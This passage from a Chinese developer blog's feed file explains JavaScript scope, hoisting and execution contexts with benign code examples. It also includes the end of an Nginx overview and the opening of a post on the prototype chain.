的网站评测功能可以帮助用户评估网站的安全性，包括网站托管地址，服务器软件，以及脚本语言等信息。</p><p>Netcraft 每月都会对全球的网站进行抽样调查，收集网站的响应头、域名、IP 地址、证书等数据，然后根据这些数据分析出网站使用的服务器软件，操作系统，网络服务商等信息。</p><p>Netcraft 的调查报告已经成为人们了解全球网站数量以及各种服务器市场份额等情况的主要依据。访问 <a href="https://www.netcraft.com/">Netcraft</a> 的官网就可以查看最新的调查结果，或者使用它的搜索功能，查询任意网站的相关信息。</p><h3 id="异步非阻塞"><a href="#异步非阻塞" class="headerlink" title="异步非阻塞"></a>异步非阻塞</h3><p>前文中有提到 master-worker 是一种异步非阻塞的进程模型。我认为可以在这里做一个更详细的描述，就是该进程模型为什么是“异步非阻塞”的：</p><ul><li><strong>异步</strong>：在 nginx 的 master-worker 模式中，master 进程负责管理 worker 进程，而 worker 进程则处理实际的客户端请求。这种架构下，master 进程和 worker 进程之间采用异步通信方式，master 进程不会阻塞在等待 worker 进程的响应上，从而提高了整体的并发处理能力；</li><li><strong>非阻塞</strong>：nginx 中的 worker 进程使用非阻塞 I&#x2F;O 操作来处理客户端请求。这意味着当一个请求需要进行 I&#x2F;O 操作时（比如读取文件或从网络接收数据），worker 进程不会一直等待数据准备就绪，而是会继续处理其他请求。一旦数据准备就绪，worker 进程会立即处理它，而不会阻塞在这个操作上；</li><li><strong>事件驱动</strong>：nginx 使用事件驱动的方式来处理 I&#x2F;O 操作。它利用操作系统提供的事件通知机制（如 epoll 或 kqueue）来实现非阻塞 I&#x2F;O。当一个事件发生时（比如一个连接建立或数据可读），nginx 将相应的事件添加到事件队列中，并通过事件驱动的方式处理这些事件，而不是通过阻塞式的等待。</li></ul><p>nginx 的 master-worker 模式通过异步、非阻塞和事件驱动的设计，实现了高性能和高并发处理能力。这种模式使得 nginx 能够高效地处理大量并发请求，而不会因为阻塞在 I&#x2F;O 操作上而导致性能下降。而 apache 传统的多进程模型（Prefork）无法实现异步非阻塞，所以会把这点作为 nginx 相比 apache 的一个优势。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>只是一个概述，很多内容等着补充 😪️</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://docshome.gitbook.io/nginx-docs/">Nginx 中文文档</a></li><li><a href="https://www.freecodecamp.org/chinese/news/the-nginx-handbook/">Nginx 完全手册</a>，by freeCodeCamp</li><li><a href="https://learnku.com/articles/38414">Nginx 工作模式和进程模型</a>，by 已下线</li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript作用域与提升</title>
      <link href="/2024/02/16/2024/js-scope-and-hoisting/"/>
      <url>/2024/02/16/2024/js-scope-and-hoisting/</url>
      
        <content type="html"><![CDATA[<p>补档，本来想把【闭包】也一并放在本文中，但发现会有些臃肿，于是本文就只写作用域与提升。</p><p>本文编写的 JavaScript 代码示范均使用 node v18.19.1，遵循 ES6 标准。</p><h2 id="Scope-作用域"><a href="#Scope-作用域" class="headerlink" title="Scope 作用域"></a>Scope 作用域</h2><p>什么是作用域呢？我的理解是：“变量的作用域就是该变量可访问的范围，函数对象同理”，作用域的作用是避免不同层级中的变量发生冲突。</p><p>JS 中主要分为两种作用域：全局作用域（global scope）和局部作用域（local scope）。</p><p>在 JS 中，局部作用域类似于“私人房间”，其中的变量只能在特定的区域内访问。当我们在局部作用域中声明变量时，它只能在该代码块、函数或条件语句中访问。局部作用域中的变量会受到外部代码干扰，例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> localVariable = <span class="string">&quot;我在局部作用域中&quot;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(localVariable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">myFunction</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(localVariable);</span><br></pre></td></tr></table></figure><p>在这段代码中，<code>localVariable</code>在局部作用域中声明，这意味着它只能在<code>myFunction</code>代码块内访问，尝试在作用域之外使用该变量会抛出<code>ReferenceError: localVariable is not defined</code>的报错。</p><p>而全局作用域中中声明的变量可以在代码的任何地方访问。它可以类比为一个“公共广场”，所有人都可以看到和访问其中的内容。在全局作用域中声明的变量通常是在任何函数或代码块之外定义的。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> globalVariable = <span class="string">&quot;我在全局作用域中&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(globalVariable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">myFunction</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalVariable);</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>globalVariable</code>在全局作用域中声明，<code>myFunction</code>中也可以直接访问它。因为<code>myFunction</code>函数中并没有对<code>globalVariable</code>显示地做出声明，也没有把其当作一个参数，同时满足这两个条件，我们就可以把<code>globalVariable</code>叫做自由变量（free variable）。</p><p>还是在这个例子中，<code>myFunction</code>中使用了<code>globalVariable</code>，但当前作用域中并没有声明该变量，此时它就会向上一级作用域（这里是全局作用域）寻找该变量，如果在上一级没有找到，就向再上一级寻找，直到找到所需变量，或者抛出<code>is not defined</code>报错。这种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx-scope -&gt; ... -&gt; global scope</span><br></pre></td></tr></table></figure><p>的查询方式，会形成一条作用域链（scope chain）。</p><blockquote><p>和 prototype chain 有些相似之处～</p></blockquote><h3 id="Block-Scope-块级作用域"><a href="#Block-Scope-块级作用域" class="headerlink" title="Block Scope 块级作用域"></a>Block Scope 块级作用域</h3><p>ES6 之前，JS 中只有全局&#x2F;局部作用域，这会导致一些潜在的问题，如循环变量泄露：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i); <span class="comment">// Outputs: 3, 3, 3</span></span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中，使用<code>var</code>在<code>for</code>循环中声明的变量<code>i</code>被提升到函数作用域，其值在循环的所有迭代中共享。这经常导致意外行为，特别是在处理像<code>setTimeout</code>这样的异步操作时。这对开发者来说很不方便，也不利于编写完善的代码。</p><p>为了解决此类问题，ES6 中新增了<code>let&amp;const</code>关键字以及块级作用域（block scope）。</p><p>有了新的语法之后，我们就可以对上面的例子做出改进：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(j); <span class="comment">// Outputs: 0, 1, 2</span></span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用<code>let</code>，变量<code>j</code>的作用域就被限制在<code>for</code>循环的块内，确保每次迭代都为<code>j</code>创建一个新的词法环境。这可以防止与变量提升和异步操作等问题。</p><p>因此，在实际开发过程中，我们一般推荐只使用<code>let&amp;const</code>，不使用<code>var</code>，这可以最大程度避免我们代码出现 bug。</p><h3 id="Static-Lexical-Scope-静态作用域"><a href="#Static-Lexical-Scope-静态作用域" class="headerlink" title="Static&#x2F;Lexical Scope 静态作用域"></a>Static&#x2F;Lexical Scope 静态作用域</h3><p>运行以下代码，会得到什么结果呢？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;global&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&#x27;local&#x27;</span>;</span><br><span class="line">    <span class="title function_">foo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bar</span>();</span><br></pre></td></tr></table></figure><p>答案是<code>global</code>，这倒不难理解，按照前面说的，<code>foo()</code>函数被调用，发现函数作用域中没有<code>x</code>变量，就沿着作用域链向上寻找，在全局作用域中找到后就输出<code>global</code>。但在有些语言中会得到不同的输出结果。</p><p>以 Perl 语言为例，实现同样功能的代码，会得到不同的输出：</p><blockquote><p>你可以使用该 <a href="https://www.jyshare.com/compile/">站点</a> 在线运行以上代码并观察输出结果。</p></blockquote><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">our</span> <span class="variable">$x</span> = <span class="string">&#x27;global&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;<span class="variable">$x</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">bar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">local</span> <span class="variable">$x</span> = <span class="string">&#x27;local&#x27;</span>;</span><br><span class="line">    foo();</span><br><span class="line">&#125;</span><br><span class="line">bar(); <span class="comment"># output: local</span></span><br></pre></td></tr></table></figure><p>原因是这两种语言对作用域的定义不同。从本质上来讲，作用域就是一套规则，这套规则用来管理引擎如何在当前作用域以及嵌套的子作用域中根据标识符名称查找变量。</p><p>常见作用域有静态作用域（static scope）和动态作用域（dynamic scope），前者在词法分析阶段就已经决定，后者则是在代码执行过程中进行动态的划分，比如函数的作用域是在函数被调用时才决定。</p><p>JS 采用的是静态作用域规则，我们在编写代码就已经决定了其作用域层级。静态作用域也叫做词法作用域（Lexical Scope），这个名称更加直白。</p><blockquote><p>如果你对什么是“词法分析”抱有疑问，可以参考我之前的文章：<a href="https://ma5hr00m.top/archives/2024/02/how-js-run.html">JavaScript 执行原理</a>。</p></blockquote><h2 id="Hoisting-提升"><a href="#Hoisting-提升" class="headerlink" title="Hoisting 提升"></a>Hoisting 提升</h2><p>讲完作用域，我们可以来说说提升（hoisting）了。</p><p>hoisting 是指将变量、函数或类的声明移动到它们所在的作用域的顶部，这允许开发者在代码中使用变量或函数时无需关心它们的声明位置。这里“移动”并不准确，但暂且按照这样理解也无妨。</p><p>这是一个最简单的例子，我们在声明<code>ping()</code>之前调用了它，但这不会导致报错：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">ping</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ping</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;pong&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不抛出报错的原因就是 JS 引擎在运行时将<code>ping()</code>的声明“移动”到了函数调用之前，也就是提升了这个函数声明。</p><p>为什么需要 hoisting 呢？在 Twitter 某位用户的询问中，Brendan Eich 回答了这个问题：</p><blockquote><p>Function declaration hoisting is for mutual recursion &amp; generally to avoid painful bottom-up ML-like order.</p></blockquote><p>在我们编写 JS 时，有时会遇到需要编写两个函数相互调用的情况，如果没有提升，处理这种情况就会变得繁琐。Brendan 不希望在 JS 中看到类似 ML 的自下而上的编程顺序。</p><h3 id="提升规则"><a href="#提升规则" class="headerlink" title="提升规则"></a>提升规则</h3><blockquote><p>如果你只想知道 Hoisting 规则，而对其原理不感兴趣，只需看完本小节。</p></blockquote><p>这是变量提升的简单演示，运行代码会输出<code>undefined</code>而非<code>ReferenceError: a is not defined</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a) <span class="comment">// output: undefined</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>JS 引擎会提升变量声明操作，而不会提升变量赋值操作。以上代码等效于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a) <span class="comment">// output: undefined</span></span><br><span class="line">a = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>再来看这段代码，运行代码输出<code>2</code>而非<code>1</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">v</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v);</span><br><span class="line">    <span class="keyword">var</span> v = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">test</span>(<span class="number">2</span>); <span class="comment">// output: 2</span></span><br></pre></td></tr></table></figure><p>函数作用域中的变量也会提升，但因为我们调用<code>test()</code>时传入了参数<code>v</code>，所以在函数内代码运行之前会有一个隐性的函数声明+赋值操作，<code>var v = 1;</code>的声明操作也会提升，但因为<code>v=2</code>的赋值操作更先执行，所以会输出<code>2</code>。以上代码等效于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">v</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> v;</span><br><span class="line">    <span class="keyword">var</span> v;</span><br><span class="line">    v = <span class="number">2</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v);</span><br><span class="line">    v = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">test</span>(<span class="number">2</span>); <span class="comment">// output: 2</span></span><br></pre></td></tr></table></figure><p>最后来看这段代码，运行代码输出<code>[Function: a]</code>而非<code>undefined</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// output: [Function: a]</span></span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;&#125;;</span><br></pre></td></tr></table></figure><p>调换2、3行的声明顺序会得到相同结果。道理很简单，函数声明提升优先级 &gt; 变量声明提升，无需过多解释。</p><p>对以上三个示例做总结，可以得到以下 JS 中关于提升的三条规则：</p><ul><li>变量、函数声明操作都会提升；</li><li>赋值操作不提升；</li><li>函数声明操作优先级 &gt; 变量声明优先级。</li></ul><h3 id="Execution-Context-执行上下文"><a href="#Execution-Context-执行上下文" class="headerlink" title="Execution Context 执行上下文"></a>Execution Context 执行上下文</h3><p>在介绍 hoisting 实现原理之前，有必要先了解 JS 的执行上下文。</p><p>ES6 的执行上下文是指运行 JS 代码时的代码环境和相关信息。执行上下文包括三个部分：</p><ul><li>词法环境（lexical environment）</li><li>变量环境（variable environment）</li><li>this 绑定（this binding）</li></ul><p>词法环境是一个存储标识符（变量，函数，类等）和它们的值的结构。词法环境有两个组成部分：环境记录（environment record）和外部环境引用（outer environment reference）。环境记录是一个存储当前作用域内的标识符和它们的值的对象；外部环境引用则是一个指向包含作用域的词法环境的指针。</p><p>变量环境是一个与词法环境类似的结构，但是它只存储<code>var</code>声明的变量。在 ES6 之前，变量环境和词法环境是相同的，但是在 ES6 中引入了<code>let&amp;const</code>关键字，变量环境和词法环境也有可能不同。</p><p><code>this</code>绑定是一个确定当前执行上下文中的<code>this</code>值的过程。<code>this</code>值取决于函数的调用方式，例如普通函数调用，方法调用，构造函数调用，箭头函数调用等。</p><blockquote><p><code>this</code>比较麻烦，本文中不细说。</p></blockquote><p>词法环境和变量环境本质上都是一种词法作用域，都是用来存储和查找标识符（变量，函数等）的值的结构。它们的区别在于，词法环境可以随着代码的执行而改变，而变量环境则保持不变。</p><p><img src="https://img.ma5hr00m.top/blog/20240226195039.png" alt="20240226195039"></p><p>我们可以把词法环境理解为一个栈，每当进入一个新的作用域，就会创建一个新的词法环境，并将其压入栈顶。这个新的词法环境包含了当前作用域内的标识符和它们的值，以及一个指向外部词法环境的引用。当退出当前作用域时，就会将栈顶的词法环境弹出，恢复到上一个词法环境。这样，词法环境就能实现词法作用域的规则，即内部作用域可以访问外部作用域的标识符，但反之不行。</p><p>变量环境则是一个特殊的词法环境，它只包含了用<code>var</code>声明的变量和函数声明。变量环境在执行上下文创建时就确定了，不会随着代码的执行而改变。这意味着，用<code>var</code>声明的变量和函数声明会被提升到它们所在的执行上下文的顶部，而不受块级作用域的限制。这也是为什么在 ES6 之前，JS 只有函数作用域，而没有块级作用域的原因。</p><p>ES6 引入了<code>let</code>和<code>const</code>关键字，它们创建的标识符只存在于词法环境中，而不在变量环境中。这样，就可以实现块级作用域，以及暂时性死区（TDZ）的特性。</p><p>下面是一个例子，说明了词法环境和变量环境的区别：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局代码</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>; <span class="comment">// 在全局执行上下文的变量环境和词法环境中</span></span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>; <span class="comment">// 只在全局执行上下文的词法环境中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 进入foo函数的执行上下文</span></span><br><span class="line">  <span class="keyword">var</span> c = <span class="number">3</span>; <span class="comment">// 在foo函数的执行上下文的变量环境和词法环境中</span></span><br><span class="line">  <span class="keyword">let</span> d = <span class="number">4</span>; <span class="comment">// 只在foo函数的执行上下文的词法环境中</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c, d); <span class="comment">// 1, 2, 3, 4</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// 进入块级作用域</span></span><br><span class="line">    <span class="keyword">var</span> e = <span class="number">5</span>; <span class="comment">// 在foo函数的执行上下文的变量环境和词法环境中</span></span><br><span class="line">    <span class="keyword">let</span> f = <span class="number">6</span>; <span class="comment">// 只在块级作用域的词法环境中</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c, d, e, f); <span class="comment">// 1, 2, 3, 4, 5, 6</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 退出块级作用域</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c, d, e); <span class="comment">// 1, 2, 3, 4, 5</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(f); <span class="comment">// ReferenceError: f is not defined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 退出foo函数的执行上下文</span></span><br><span class="line"><span class="title function_">foo</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b); <span class="comment">// 1, 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c, d, e, f); <span class="comment">// ReferenceError: c is not defined</span></span><br></pre></td></tr></table></figure><p>到这里应该就能理解词法环境和变量环境是什么了，如果还是感觉疑惑，不清楚这俩环境到底是什么，可以看看 <a href="https://stackoverflow.com/questions/23948198/variable-environment-vs-lexical-environment">Variable Environment vs lexical environment</a> 这篇问答，里面解释得更详细一些。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>经过前面这么多铺垫，我感觉 Hoisting 的实现原理已经比较明晰。其实解释执行上下文的时候就已经算是在解释 Hositing 工作原理了。</p><p>我们可以把 JS 执行划分为以下几个步骤，但重点放在提升操作上：</p><ol><li>创建全局执行上下文，并将其压入执行栈。</li><li>对全局代码进行扫描，将<code>var</code>声明的变量添加到全局执行上下文的变量环境中，并赋值为<code>undefined</code>。将函数声明添加到全局执行上下文的词法环境中，并赋值为函数对象。对于<code>let</code>和<code>const</code>声明的变量，不会被提升，而是在全局执行上下文的词法环境中创建一个未初始化的绑定，直到它们被赋值为止。这就是暂时性死区（TDZ）的概念，即在变量被赋值之前，不能被访问或使用。</li><li>开始执行全局代码，按照顺序逐行执行。如果遇到函数调用，就创建一个函数执行上下文，并将其压入执行栈。</li><li>对函数代码进行扫描，将<code>var</code>声明的变量添加到函数执行上下文的变量环境中，并赋值为<code>undefined</code>。将函数声明添加到函数执行上下文的词法环境中，并赋值为函数对象。对于<code>let</code>和<code>const</code>声明的变量，同样不会被提升，而是在函数执行上下文的词法环境中创建一个未初始化的绑定，直到它们被赋值为止。</li><li>开始执行函数代码，按照顺序逐行执行。如果遇到函数调用，就重复步骤3和4。如果遇到<code>return</code>语句，就返回函数的结果，并将函数执行上下文从执行栈中弹出。</li><li>当全局代码执行完毕，就将全局执行上下文从执行栈中弹出，程序结束。</li></ol><p>流程如此，具体到代码中，把自己想象成 JS 引擎，按照上面的执行流程分析即可。如果感兴趣，可以试着分析以下代码，对应的输出也已经给在每行代码后面了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// ReferenceError: Cannot access &#x27;b&#x27; before initialization</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">c</span>()); <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">d</span>()); <span class="comment">// TypeError: d is not a function</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">c</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>文中有些概念并不明晰，但直接解释又会影响连贯性，于是摘出来放在这里。</p><h3 id="ML-like-Order"><a href="#ML-like-Order" class="headerlink" title="ML-like Order"></a>ML-like Order</h3><p>ML 是一种通用的函数式编程语言，具有可扩展的类型系统。它支持多态类型推断，这几乎消除了指定变量类型的负担，并极大地促进了代码的重用。ML 虽然没有得到广泛的使用，但它对其他语言产生了很大的影响，比如 Haskell、Rust、Scala 等。</p><p>下面是一个用 Standard ML 编写的阶乘函数的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fun factorial n =</span><br><span class="line">    if n = 0 then 1 else n * factorial (n-1)</span><br></pre></td></tr></table></figure><p>这个函数必须在调用它的地方之前定义，否则会报错。</p><p>ML-like Order 是指 ML 语言中的函数定义顺序，它是自下而上的，也就是说，一个函数必须在它被调用之前定义。这样的顺序有时会导致一些不便，比如前面讲到的函数相互递归的情景，ML 就需要使用特殊的 fun 和 and 关键字，这种函数则会被称为互递归函数。比如判断一个自然数是奇数还是偶数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fun isOdd n = if n = 0 then false else isEven (n-1)</span><br><span class="line">and isEven n = if n = 0 then true else isOdd (n-1)</span><br></pre></td></tr></table></figure><p>为了避免这种情况，一些其他的语言（比如 JS）采用了函数声明提升（FDs hoisting）的机制，允许在任何地方定义函数，而不用考虑顺序。</p><h2 id="参阅文章"><a href="#参阅文章" class="headerlink" title="参阅文章"></a>参阅文章</h2><ul><li>[解读ECMAScript<a href="https://www.cnblogs.com/leoo2sk/archive/2010/12/19/ecmascript-scope.html">1]——执行环境、作用域及闭包</a>，by Eric Zhang</li><li><a href="https://juejin.cn/post/7030765196574457892#heading-8">详解JavaScript作用域和作用域链</a>，by Rockky</li><li><a href="https://blog.huli.tw/2018/12/08/javascript-closure/">所有的函式都是閉包：談 JS 中的作用域與 Closure</a>，by Huli</li><li><a href="https://blog.huli.tw/2018/11/10/javascript-hoisting-and-tdz/">我知道你懂 hoisting，可是你了解到多深</a>，by Huli</li><li><a href="https://262.ecma-international.org/6.0/">ECMAScript® 2015 Language Specification</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链详解</title>
      <link href="/2024/02/14/2024/js-prototype-chain/"/>
      <url>/2024/02/14/2024/js-prototype-chain/</url>
      
        <content type="html"><![CDATA[<p>继续补档，发现这块内容其实蛮多的。后面估计还会有两篇（怎么还有两篇啊喂！），分别是 <a href="#">JavaScript执行原理·补</a> 和 <a href="#">JavaScript部分特性</a>，这周不知道能不能搞定。</p><p>先看 JS 原型链吧。</p><h2 id="JS-继承机制设计"><a href="#JS-继承机制设计" class="headerlink" title="JS 继承机制设计"></a>JS 继承机制设计</h2><p>1994年，网景公司（Netscape）发布了 Navigator v0.9，轰动一时。但当时的网页不具备交互功能，数据的交互全部依赖服务器端，这浪费了时间与服务器资源。</p><p>网景公司需要一种网页脚本语言实现用户与浏览器的互动，工程师 <a href="https://brendaneich.com/">Brendan Eich</a> 负责该语言的开发。他认为这种语言不必复杂，只需进行一些简单操作即可，比如填写表单。</p><p>可能是受当时面向对象编程（object-oriented programming）的影响，Brendan  设计的 JS 里面所有的数据类型都是对象（object）。他需要为 JS 设计一种机制把这些对象连接起来，即“继承”机制。</p><blockquote><p>继承允许子类继承父类的属性和方法，并且可以在子类中添加新的属性和方法，实现代码的重用和扩展性。</p></blockquote><p>出于设计的初衷，即“开发一种简单的网页脚本语言”，Brendan 没有选择给 JS 引入类（class）的概念，而是创造了基于原型链的继承机制。</p><p>在 Java 等面向对象的语言中，一般是通过调用 class 的构造函数（construct）创建实例，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 